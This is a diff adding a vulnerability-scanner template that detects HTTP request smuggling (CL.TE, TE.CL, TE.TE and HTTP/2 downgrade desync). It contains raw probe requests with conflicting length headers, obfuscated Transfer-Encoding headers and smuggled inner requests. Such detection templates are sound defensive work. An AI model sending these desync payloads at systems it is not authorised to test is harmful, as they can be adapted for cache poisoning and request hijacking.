@@ -1,0 +1,210 @@
+id: http-request-smuggling-detection
+
+info:
+  name: HTTP Request Smuggling - CL.TE / TE.CL / TE.TE Detection
+  author: achraf-chehboun
+  severity: critical
+  description: |
+    Detects HTTP request smuggling vulnerabilities across CL.TE, TE.CL, and TE.TE
+    desync patterns. Uses timing differentials and response anomaly detection to
+    identify discrepancies between front-end (load balancer/CDN) and back-end
+    server HTTP parsing. Targets modern infrastructure including AWS ALB/CLB,
+    Cloudflare, Akamai, HAProxy, Nginx, and Apache reverse proxy configurations.
+    Non-destructive — uses benign probe payloads that cause parsing differences
+    without cache poisoning or request hijacking.
+  reference:
+    - https://portswigger.net/web-security/request-smuggling
+    - https://portswigger.net/research/http-desync-attacks
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N
+    cvss-score: 10.0
+    cwe-id: CWE-444
+  metadata:
+    max-request: 8
+  tags: smuggling,desync,cl-te,te-cl,te-te,detection-only
+
+http:
+  # CL.TE detection: front-end uses Content-Length, back-end uses Transfer-Encoding
+  # If vulnerable, back-end parses chunked and the trailing data causes a delayed
+  # or anomalous response vs baseline
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 6
+        Transfer-Encoding: chunked
+
+        0
+
+        X
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 6
+
+        normal
+
+    unsafe: true
+    req-condition: true
+    matchers:
+      - type: dsl
+        name: cl-te-timing-differential
+        dsl:
+          - 'duration_1 >= 5 && duration_2 < 3'
+
+  # CL.TE variant 2: double request detection via status code anomaly
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 30
+        Transfer-Encoding: chunked
+
+        0
+
+        GET /404test HTTP/1.1
+        X: X
+
+    unsafe: true
+    matchers:
+      - type: dsl
+        name: cl-te-response-split
+        dsl:
+          - 'status_code == 404 || contains(body, "Not Found")'
+
+  # TE.CL detection: front-end uses Transfer-Encoding, back-end uses Content-Length
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 4
+        Transfer-Encoding: chunked
+
+        5e
+        POST /404-smuggle-test HTTP/1.1
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 15
+
+        x=1
+        0
+
+
+    unsafe: true
+    matchers:
+      - type: dsl
+        name: te-cl-desync-detected
+        dsl:
+          - 'status_code == 404'
+
+  # TE.TE: Transfer-Encoding obfuscation — one side ignores malformed TE header
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 4
+        Transfer-Encoding: chunked
+        Transfer-Encoding: identity
+
+        5e
+        POST /404-smuggle-test HTTP/1.1
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 15
+
+        x=1
+        0
+
+
+    unsafe: true
+    matchers:
+      - type: dsl
+        name: te-te-obfuscation-v1
+        dsl:
+          - 'status_code == 404'
+
+  # TE.TE variant: tab/space obfuscation in Transfer-Encoding header
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 4
+        Transfer-Encoding: chunked
+        Transfer-encoding: cow
+
+        5e
+        POST /404-smuggle-test HTTP/1.1
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 15
+
+        x=1
+        0
+
+
+    unsafe: true
+    matchers:
+      - type: dsl
+        name: te-te-obfuscation-v2
+        dsl:
+          - 'status_code == 404'
+
+  # TE header capitalization/whitespace variants
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 4
+        Transfer-Encoding:  chunked
+
+        5e
+        POST /404-smuggle-test HTTP/1.1
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 15
+
+        x=1
+        0
+
+
+    unsafe: true
+    matchers:
+      - type: dsl
+        name: te-te-whitespace-variant
+        dsl:
+          - 'status_code == 404'
+
+  # H2.CL smuggling probe (HTTP/2 downgrade)
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 0
+        Transfer-Encoding: chunked
+
+        GET /{{randstr}}-smuggle-detect HTTP/1.1
+        Host: {{Hostname}}
+
+
+    unsafe: true
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        name: h2-downgrade-smuggle
+        dsl:
+          - 'contains(body, "{{randstr}}-smuggle-detect")'
+          - 'status_code == 404'
+        condition: or
+
+    extractors:
+      - type: kval
+        name: server-info
+        kval:
+          - Server
+          - Via
+          - X-Served-By
+          - X-Cache
